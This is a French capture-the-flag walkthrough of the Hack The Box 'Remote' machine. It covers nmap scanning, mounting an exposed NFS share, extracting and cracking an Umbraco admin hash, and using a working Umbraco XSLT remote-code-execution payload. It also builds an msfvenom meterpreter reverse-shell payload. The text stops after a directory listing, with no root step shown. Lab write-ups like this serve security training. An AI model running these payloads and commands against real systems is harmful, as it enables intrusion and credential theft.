---
layout: post
title: HTB - Remote
subtitle: Hack The Box - Windows Machine - Easy 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [HTB, Windows, Umbraco, RCE, NFS, mountd, John, SHA-1, IIS, TeamViewer, winPEAS, CVE-2019-18988, Metasploit, evil-winrm]
comments: false
---

## 1. User

http://10.10.10.180/contact/

On trouve: 

~~~
Umbraco Forms is required to render this form.It's a breeze to install, all you have to do is go to the Umbraco Forms section in the back office and click Install, that's it! :) 
~~~

http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms

Umbraco Exploit: RCE [https://www.exploit-db.com/exploits/46153](https://www.exploit-db.com/exploits/46153)

Nom d'utilisateurs ? http://10.10.10.180/people/

~~~
root@Host-001:~# nmap -sS -sV 10.10.10.180
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-28 13:49 CET
Nmap scan report for 10.10.10.180
Host is up (0.090s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.00 seconds
root@Host-001:~# 
~~~

Port 2049 mountd = NFS . Ref: [https://resources.infosecinstitute.com/exploiting-nfs-share/#gref](https://resources.infosecinstitute.com/exploiting-nfs-share/#gref)

~~~
root@Host-001:~# showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
root@Host-001:~# mkdir tmp/htb_remote
root@Host-001:~# mount -t nfs 10.10.10.180:/site_backups /tmp/htb_remote
~~~

Aller dans /tmp/htb_remote

~~~
root@Host-001:/tmp/htb_remote# ls -la
total 123
drwx------  2 nobody 4294967294  4096 févr. 23 19:35 .
drwxrwxrwt 17 root   root        4096 mars  28 14:06 ..
drwx------  2 nobody 4294967294    64 févr. 20 18:16 App_Browsers
drwx------  2 nobody 4294967294  4096 févr. 20 18:17 App_Data
drwx------  2 nobody 4294967294  4096 févr. 20 18:16 App_Plugins
drwx------  2 nobody 4294967294    64 févr. 20 18:16 aspnet_client
drwx------  2 nobody 4294967294 49152 févr. 20 18:16 bin
drwx------  2 nobody 4294967294  8192 févr. 20 18:16 Config
drwx------  2 nobody 4294967294    64 févr. 20 18:16 css
-rwx------  1 nobody 4294967294   152 nov.   1  2018 default.aspx
-rwx------  1 nobody 4294967294    89 nov.   1  2018 Global.asax
drwx------  2 nobody 4294967294  4096 févr. 20 18:16 Media
drwx------  2 nobody 4294967294    64 févr. 20 18:16 scripts
drwx------  2 nobody 4294967294  8192 févr. 20 18:16 Umbraco
drwx------  2 nobody 4294967294  4096 févr. 20 18:16 Umbraco_Client
drwx------  2 nobody 4294967294  4096 févr. 20 18:16 Views
-rwx------  1 nobody 4294967294 28539 févr. 20 06:57 Web.config
root@Host-001:/tmp/htb_remote# cd App_Data/
root@Host-001:/tmp/htb_remote/App_Data# ls
cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
root@Host-001:/tmp/htb_remote/App_Data# strings Umbraco.sdf | grep user | grep pass
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change

root@Host-001:~/Bureau# strings Umbraco.sdf | grep hash
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
~~~

admin -- hash (SHA1) b8be16afba8c314ad33d812f22a04991b90e2aaa - Crackons le avec John

~~~
root@Host-001:~/Bureau# john --format=raw-sha1 hash_remote --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
baconandcheese   (?)
1g 0:00:00:01 DONE (2020-03-28 17:24) 0.6493g/s 6379Kp/s 6379Kc/s 6379KC/s baconandchipies1..bacon918
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
root@Host-001:~/Bureau# 
~~~

On peut se loguer au formulaire Umbraco http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms
Credentials: admin@htb.local::baconandcheese

On lit le PoC RCE: [https://www.exploit-db.com/exploits/46153](https://www.exploit-db.com/exploits/46153)

Le payload utilisé est:

~~~
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>
~~~

Ce Payload est envoyé à la paghe vulnérable: HOST/umbraco/developer/Xslt/xsltVisualize.aspx
Ce Payload est envoyé dans le paramètre "ctl00$body$xsltSelection" voir la partie finale du PoC:

~~~
soup = BeautifulSoup(r3.text, 'html.parser');
VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};
~~~

Une autre version du PoC est diponible ici: [https://github.com/noraj/Umbraco-RCE](https://github.com/noraj/Umbraco-RCE)
Le script est similaire a celui sur exploitDB mais inclut des arguments.

~~~
payload = """\
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "%s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "%s"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>\
""" % (args.arguments, args.command)
~~~

On voit donc tres bien que "string cmd = " contient de possibles arguments et "proc.StartInfo.FileName = " le nom du process lancé.

Allons sur http://10.10.10.180/umbraco/developer/Xslt/xsltVisualize.aspx

Interceptant avec Burp la requête générée lorsqu'on clique sur 'Visualize XSLT"
Insérer le payload dans le paramètre "ctl00$body$xsltSelection"

payload de Test:

~~~
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "ipconfig"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>
~~~

ça marche :) on a l'IP

Test 2:

~~~
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "-NoProfile -Command ls"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>
~~~

OK on a la liste des fichiers

Test 3:

~~~
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "-NoProfile -Command whoami"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>
~~~

Reponse: iis apppool\defaultapppool 

Test 4: Quels sont les noms d'utilisateurs?

~~~
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "-NoProfile -Command dir C:\\Users\\"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>
~~~

Reponse: 

~~~
Directory: C:\Users 
Mode LastWriteTime Length Name 
---- ------------- ------ ---- 
d----- 2/19/2020 3:12 PM .NET v2.0 
d----- 2/19/2020 3:12 PM .NET v2.0 Classic 
d----- 2/19/2020 3:12 PM .NET v4.5 
d----- 2/19/2020 3:12 PM .NET v4.5 Classic 
d----- 4/1/2020 9:10 AM Administrator 
d----- 2/19/2020 3:12 PM Classic .NET AppPool 
d-r--- 2/20/2020 2:42 AM Public
~~~

Test 5: Il y a quoi dans le répertoire Public ?

~~~
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "-NoProfile -Command dir C:\\Users\\Public\\"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>
~~~

Reponse:

~~~
Directory: C:\Users\Public Mode LastWriteTime Length Name ---- ------------- ------ ---- d-r--- 2/19/2020 3:03 PM Documents d-r--- 9/15/2018 3:19 AM Downloads d-r--- 9/15/2018 3:19 AM Music d-r--- 9/15/2018 3:19 AM Pictures d-r--- 9/15/2018 3:19 AM Videos -ar--- 4/1/2020 9:10 AM 34 user.txt 
~~~

Payload: cat user.txt

~~~
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "-NoProfile -Command type C:\\Users\\Public\\user.txt"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>
~~~

Réponse:

~~~
1d26f8b1232d0f8dca84ba8d93b39f94 
~~~

# Root.txt

~~~
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "-NoProfile -Command ls C:\\Windows\\"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>
~~~
~~~
Directory: C:\Windows 
Mode LastWriteTime Length Name 
---- ------------- ------ ---- 
d----- 3/10/2020 11:05 AM $Reconfig$ 
d----- 9/15/2018 3:19 AM ADFS 
d----- 2/20/2020 6:35 PM appcompat 
d----- 10/29/2018 6:39 PM apppatch 
d----- 2/19/2020 3:11 PM AppReadiness 
d-r--- 2/27/2020 8:54 AM assembly 
d----- 9/15/2018 3:19 AM bcastdvr 
d----- 9/15/2018 3:19 AM Boot 
d----- 9/15/2018 3:19 AM Branding 
d----- 3/18/2020 4:45 PM CbsTemp 
d----- 9/15/2018 3:19 AM Containers 
d----- 9/15/2018 3:19 AM Cursors 
d----- 2/19/2020 3:03 PM debug 
d----- 9/15/2018 3:19 AM diagnostics 
d----- 9/15/2018 5:05 AM DigitalLocker 
d---s- 9/15/2018 3:19 AM Downloaded Program Files 
d----- 9/15/2018 3:19 AM drivers 
d----- 9/15/2018 5:05 AM en-US 
d-r-s- 2/19/2020 3:11 PM Fonts 
d----- 9/15/2018 3:19 AM Globalization 
d----- 9/15/2018 5:05 AM Help 
d----- 9/15/2018 3:19 AM IdentityCRL 
d----- 9/15/2018 5:05 AM IME 
d-r--- 2/19/2020 6:02 PM ImmersiveControlPanel 
d----- 2/27/2020 9:46 AM INF 
d----- 9/15/2018 3:19 AM InputMethod 
d----- 9/15/2018 3:19 AM L2Schemas 
d----- 9/15/2018 3:19 AM LiveKernelReports 
d----- 2/27/2020 10:29 AM Logs 
d-r-s- 9/15/2018 3:19 AM media 
d-r--- 4/1/2020 10:17 AM Microsoft.NET 
d----- 9/15/2018 3:19 AM Migration 
d----- 9/15/2018 3:19 AM ModemLogs 
d----- 9/15/2018 5:07 AM OCR 
d-r--- 9/15/2018 3:19 AM Offline Web Pages 
d----- 2/19/2020 6:02 PM Panther 
d----- 9/15/2018 3:19 AM Performance 
d----- 9/15/2018 3:19 AM PLA 
d----- 9/15/2018 5:08 AM PolicyDefinitions 
d----- 2/19/2020 6:02 PM Prefetch 
d-r--- 2/19/2020 6:02 PM PrintDialog 
d----- 9/15/2018 3:19 AM Provisioning 
d----- 4/1/2020 10:12 AM Registration 
d----- 9/15/2018 3:19 AM RemotePackages 
d----- 9/15/2018 3:19 AM rescache 
d----- 9/15/2018 3:19 AM Resources 
d----- 9/15/2018 3:19 AM SchCache 
d----- 9/15/2018 3:19 AM schemas 
d----- 9/15/2018 3:19 AM security 
d----- 2/19/2020 3:36 PM ServiceProfiles 
d----- 2/19/2020 6:02 PM ServiceState 
d----- 3/18/2020 4:45 PM servicing 
d----- 9/15/2018 3:21 AM Setup 
d----- 9/15/2018 3:19 AM ShellComponents 
d----- 9/15/2018 3:19 AM ShellExperiences 
d----- 9/15/2018 3:19 AM SKB 
d----- 2/19/2020 3:03 PM SoftwareDistribution 
d----- 9/15/2018 3:19 AM Speech 
d----- 9/15/2018 3:19 AM Speech_OneCore 
d----- 9/15/2018 3:19 AM System 
d----- 4/1/2020 10:37 AM System32 
d----- 9/15/2018 3:19 AM SystemApps 
d----- 9/15/2018 3:19 AM SystemResources 
d----- 2/23/2020 2:19 PM SysWOW64 
d----- 9/15/2018 3:19 AM TAPI 
d----- 2/19/2020 6:02 PM Tasks 
d----- 4/1/2020 10:44 AM Temp 
d----- 9/15/2018 3:19 AM TextInput 
d----- 9/15/2018 3:19 AM tracing 
d----- 9/15/2018 3:19 AM twain_32 
d----- 9/15/2018 3:19 AM Vss 
d----- 9/15/2018 3:19 AM WaaS 
d----- 9/15/2018 3:19 AM Web 
d----- 2/27/2020 7:35 AM WinSxS 
-a---- 9/15/2018 3:12 AM 78848 bfsvc.exe 
-a--s- 4/1/2020 10:27 AM 67584 bootstat.dat 
-a---- 2/19/2020 6:02 PM 1947 DtcInstall.log 
-a---- 10/29/2018 6:39 PM 4245280 explorer.exe 
-a---- 9/15/2018 3:12 AM 1065472 HelpPane.exe 
-a---- 9/15/2018 3:12 AM 18432 hh.exe 
-a---- 2/19/2020 3:12 PM 87342 iis.log 
-a---- 2/19/2020 6:02 PM 1376 lsasetup.log 
-a---- 9/15/2018 3:12 AM 43131 mib.bin 
-a---- 9/15/2018 3:12 AM 254464 notepad.exe 
-a---- 2/23/2020 1:35 PM 6332 PFRO.log 
-a---- 9/15/2018 3:12 AM 358400 regedit.exe 
-a---- 9/15/2018 3:13 AM 30931 ServerStandard.xml 
-a---- 9/15/2018 3:13 AM 132096 splwow64.exe 
-a---- 9/15/2018 3:16 AM 219 system.ini 
-a---- 9/15/2018 3:13 AM 64512 twain_32.dll 
-a---- 9/15/2018 3:16 AM 92 win.ini 
-a---- 4/1/2020 10:42 AM 276 WindowsUpdate.log 
-a---- 9/15/2018 3:13 AM 11776 winhlp32.exe 
-a---- 9/15/2018 3:12 AM 316640 WMSysPr9.prx 
-a---- 2/20/2020 12:52 AM 193 WORDPAD.INI 
-a---- 9/15/2018 3:12 AM 11264 write.exe 
~~~
~~~
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "-NoProfile -Command ls C:\\Windows\\RemotePackages"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>
~~~
~~~
Directory: C:\Windows\RemotePackages Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/15/2018 3:19 AM RemoteApps d----- 9/15/2018 3:19 AM RemoteDesktops 
~~~
~~~
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "-NoProfile -Command tasklist /v"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>
~~~
~~~
(....)VGAuthService.exe 3056 0 10,340 K Unknown N/A 0:00:00 N/A svchost.exe 3064 0 7,476 K Unknown N/A 0:00:00 N/A MsMpEng.exe 2076 0 106,652 K Unknown N/A 0:00:43 N/A TeamViewer_Service.exe 2416 0 18,820 K Unknown N/A 0:00:05 N/A svchost.exe 3092 0 10,808 K Unknown N/A 0:00:00 N/A svchost.exe 3100 0 12,772 K Unknown N/A 0:00:00 N/A svchost.exe 3232 0 11,672 K
~~~

TeamViewer est en marche

On change de méthose et on crée un reverse shell:

~~~
root@Host-001:~/Bureau/htb/Remote# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.53 LPORT=1234 -f exe > payload.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
root@Host-001:~/Bureau/htb/Remote# 
~~~

On utilise l'exploit [https://github.com/noraj/Umbraco-RCE/blob/master/exploit.py](https://github.com/noraj/Umbraco-RCE/blob/master/exploit.py) qui permet d'avoir un shell

~~~
root@Host-001:~/Bureau/htb/Remote# vim exploit.py
root@Host-001:~/Bureau/htb/Remote# python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'ls C:'


    Directory: C:\windows\system32\inetsrv


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/19/2020   3:11 PM                Config                                                                
d-----        2/19/2020   3:11 PM                en                                                                    
d-----        2/19/2020   3:11 PM                en-US                                                                 
d-----        7/31/2020   1:00 PM                History                                                               
d-----        2/19/2020   3:11 PM                MetaBack                                                              
-a----        2/19/2020   3:11 PM         252928 abocomp.dll                                                           
-a----        2/19/2020   3:11 PM         324608 adsiis.dll                                                            
-a----        2/19/2020   3:11 PM         119808 appcmd.exe                                                            
-a----        9/15/2018   3:14 AM           3810 appcmd.xml                                                            
-a----        2/19/2020   3:11 PM         181760 AppHostNavigators.dll                                                 
-a----        2/19/2020   3:11 PM          80896 apphostsvc.dll                                                        
-a----        2/19/2020   3:11 PM         406016 appobj.dll                                                            
-a----        2/19/2020   3:11 PM         504320 asp.dll                                                               
-a----        2/19/2020   3:11 PM          22196 asp.mof                                                               
-a----        2/19/2020   3:11 PM         131072 aspnetca.exe                                                          
-a----        2/19/2020   3:11 PM          23040 asptlb.tlb                                                            
-a----        2/19/2020   3:11 PM          40448 authanon.dll                                                          
-a----        2/19/2020   3:11 PM          38400 authbas.dll                                                           
-a----        2/19/2020   3:11 PM          27136 authcert.dll                                                          
-a----        2/19/2020   3:11 PM          44544 authmap.dll                                                           
-a----        2/19/2020   3:11 PM          40960 authmd5.dll                                                           
-a----        2/19/2020   3:11 PM          52736 authsspi.dll                                                          
-a----        2/19/2020   3:11 PM          49664 bitsiissetup.exe                                                      
-a----        2/19/2020   3:11 PM          74240 browscap.dll                                                          
-a----        2/19/2020   3:11 PM          34474 browscap.ini                                                          
-a----        2/19/2020   3:11 PM          24064 cachfile.dll                                                          
-a----        2/19/2020   3:11 PM          52224 cachhttp.dll                                                          
-a----        2/19/2020   3:11 PM          15872 cachtokn.dll                                                          
-a----        2/19/2020   3:11 PM          14336 cachuri.dll                                                           
-a----        2/19/2020   3:11 PM          43520 cgi.dll                                                               
-a----        2/19/2020   3:11 PM          86528 coadmin.dll                                                           
-a----        2/19/2020   3:11 PM          43008 compdyn.dll                                                           
-a----        2/19/2020   3:11 PM          54784 compstat.dll                                                          
-a----        2/19/2020   3:11 PM          47104 custerr.dll                                                           
-a----        2/19/2020   3:11 PM          20480 defdoc.dll                                                            
-a----        2/19/2020   3:11 PM          38912 diprestr.dll                                                          
-a----        2/19/2020   3:11 PM          24064 dirlist.dll                                                           
-a----        2/19/2020   3:11 PM          68096 filter.dll                                                            
-a----        2/19/2020   3:11 PM          19968 ftpconfigext.dll                                                      
-a----        2/19/2020   3:11 PM          14336 ftpctrlps.dll                                                         
-a----        2/19/2020   3:11 PM          14848 ftpmib.dll                                                            
-a----        2/19/2020   3:11 PM          15360 ftpres.dll                                                            
-a----        2/19/2020   3:11 PM         439296 ftpsvc.dll                                                            
-a----        2/19/2020   3:11 PM          69990 ftpsvc.mof                                                            
-a----        2/19/2020   3:11 PM          38400 gzip.dll                                                              
-a----        2/19/2020   3:11 PM          22016 httpmib.dll                                                           
-a----        2/19/2020   3:11 PM          18432 hwebcore.dll                                                          
-a----        2/19/2020   3:11 PM          63105 iis.msc                                                               
-a----        2/19/2020   3:11 PM          26112 iisadmin.dll                                                          
-a----        2/19/2020   3:11 PM          46592 iiscertprovider.dll                                                   
-a----        2/19/2020   3:11 PM        1016832 iiscfg.dll                                                            
-a----        2/19/2020   3:11 PM         307200 iiscore.dll                                                           
-a----        2/19/2020   3:11 PM         132608 iisetw.dll                                                            
-a----        2/19/2020   3:11 PM         104448 iisext.dll                                                            
-a----        2/19/2020   3:11 PM          86016 iisfcgi.dll                                                           
-a----        2/19/2020   3:11 PM         168448 iisfreb.dll                                                           
-a----        2/19/2020   3:11 PM         110080 iisreg.dll                                                            
-a----        2/19/2020   3:11 PM          18432 iisreqs.dll                                                           
-a----        2/19/2020   3:11 PM         231936 iisres.dll                                                            
-a----        2/19/2020   3:11 PM          37888 iisrstas.exe                                                          
-a----        2/19/2020   3:11 PM         192512 iissetup.exe                                                          
-a----        2/19/2020   3:11 PM          57344 iissyspr.dll                                                          
-a----        2/19/2020   3:11 PM          14848 iisual.exe                                                            
-a----        2/19/2020   3:11 PM         284672 iisutil.dll                                                           
-a----        2/19/2020   3:11 PM         612864 iisw3adm.dll                                                          
-a----        2/19/2020   3:11 PM          49152 iiswsock.dll                                                          
-a----        2/19/2020   3:11 PM          33792 iis_ssi.dll                                                           
-a----        2/19/2020   3:11 PM          16896 inetinfo.exe                                                          
-a----        2/19/2020   3:11 PM         125440 InetMgr.exe                                                           
-a----        2/19/2020   3:11 PM         256000 infocomm.dll                                                          
-a----        2/19/2020   3:11 PM          30208 iprestr.dll                                                           
-a----        2/19/2020   3:11 PM         131584 isapi.dll                                                             
-a----        2/19/2020   3:11 PM          67072 isatq.dll                                                             
-a----        2/19/2020   3:11 PM          25600 iscomlog.dll                                                          
-a----        2/19/2020   3:11 PM          36352 loghttp.dll                                                           
-a----        2/19/2020   3:11 PM          39424 logscrpt.dll                                                          
-a----        2/19/2020   3:11 PM         685464 MBSchema.bin.00000000h                                                
-a----        2/19/2020   3:11 PM         266906 MBSchema.xml                                                          
-a----        7/31/2020   1:00 PM          10152 MetaBase.xml                                                          
-a----        2/19/2020   3:11 PM         334848 metadata.dll                                                          
-a----        2/19/2020   3:11 PM         147456 Microsoft.Web.Administration.dll                                      
-a----        2/19/2020   3:11 PM        1052672 Microsoft.Web.Management.dll                                          
-a----        2/19/2020   3:11 PM          44032 modrqflt.dll                                                          
-a----        2/19/2020   3:11 PM         478720 nativerd.dll                                                          
-a----        2/19/2020   3:11 PM          27136 protsup.dll                                                           
-a----        2/19/2020   3:11 PM          21504 redirect.dll                                                          
-a----        2/19/2020   3:11 PM          10752 rpcref.dll                                                            
-a----        2/19/2020   3:11 PM          33792 rsca.dll                                                              
-a----        2/19/2020   3:11 PM          51200 rscaext.dll                                                           
-a----        2/19/2020   3:11 PM          40448 static.dll                                                            
-a----        2/19/2020   3:11 PM         189952 uihelper.dll                                                          
-a----        2/19/2020   3:11 PM          23552 urlauthz.dll                                                          
